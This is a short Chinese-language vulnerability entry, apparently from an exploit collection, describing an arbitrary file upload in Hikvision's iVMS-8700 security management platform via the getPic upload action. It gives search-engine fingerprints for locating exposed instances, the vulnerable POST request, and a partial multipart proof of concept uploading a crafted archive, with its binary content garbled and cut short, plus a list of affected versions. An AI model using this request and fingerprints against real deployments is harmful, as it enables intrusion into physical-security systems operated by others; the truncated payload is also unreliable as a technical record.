# 海康威视iVMS-8700综合安防管理平台getPic任意文件上传

- **系统**：海康　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`hunter：`web.body="/views/home/file/installPackage.rar"` ｜ `web.body="/home/locationIndex.action"``
- **请求**：`POST /msp/home/upload.action;getPic?&type=ios HTTP/1.1`

**请求体 / payload**
```
1.生成一个压缩文件，目录结构如下。\
\[output.zip]\(公众号：渗透安全HackTwo>\

2. poc
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: xx.xx.xx.xx
Content-Length: 1288
--00content0boundary00
Content-Disposition: form-data; name="type"
ios
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="stc.ipa"
PK�����z¦nW���������������test1/test/PK����xäVM(?jù��������test1/test/.DS_StoreíÁJÃ@Eïº¥ËÐ?eBÀµÖJ]¤M(ê:¦ÿãO4¹¥-
¡Ýµô,Î÷&y$$ó�fü=®¦6í`Æ{C¾î&k Ä<îñó «ýÏm…（脚本共 1658 字，完整版见原文）
```

**其他**
- 海康威视iVMS-8700综合安防管理平台 getPic任意文件上传: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 海康威视综合安防系统iVMS-5000
* 海康威视综合安防系统 iVMS-8700
* 海康威视综合安防系统iVMS-5200